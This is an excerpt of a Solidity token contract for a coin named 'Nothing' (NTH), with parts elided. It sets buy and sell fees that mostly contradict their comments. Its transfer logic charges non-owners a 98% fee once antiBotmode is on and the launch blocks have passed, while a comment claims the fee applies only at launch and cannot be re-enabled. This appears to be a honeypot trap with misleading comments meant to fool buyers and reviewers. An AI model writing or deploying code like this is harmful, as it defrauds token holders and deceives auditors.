...
contract Nothing is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    address payable private marketingWallet = payable(0x5e7C6B64B79047a4423E581b7357c58b4f4135b8); // Marketing Wallet
    address payable private devWallet = payable (0x5e7C6B64B79047a4423E581b7357c58b4f4135b8); // dev Wallet
    ...
    uint256 private _tTotal = 200000000  * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    string private _name = "Nothing";
    string private _symbol = "NTH";
    

    uint256 public _maxWalletToken = _tTotal.div(100).mul(2); //0.5% for first few mins

    uint256 public _buyLiquidityFee = 10;
    uint256 public _buyDevFee = 0;     //6% 
    uint256 public _buyMarketingFee = 40;   //4%
    uint256 public _buyReflectionFee = 0;

    uint256 public _sellLiquidityFee = 10;
    uint256 public _sellMarketingFee = 40;  //10%
    uint256 public _sellDevFee = 0;   //10%
    ...
    function _transfer(
        ...
        if(launchedAt>0 && from!= owner() && block.number >= (launchedAt + deadBlocks)  && antiBotmode){
                currenttotalFee=980;    //98% -> only on launch -> cant be enabled in future
        }
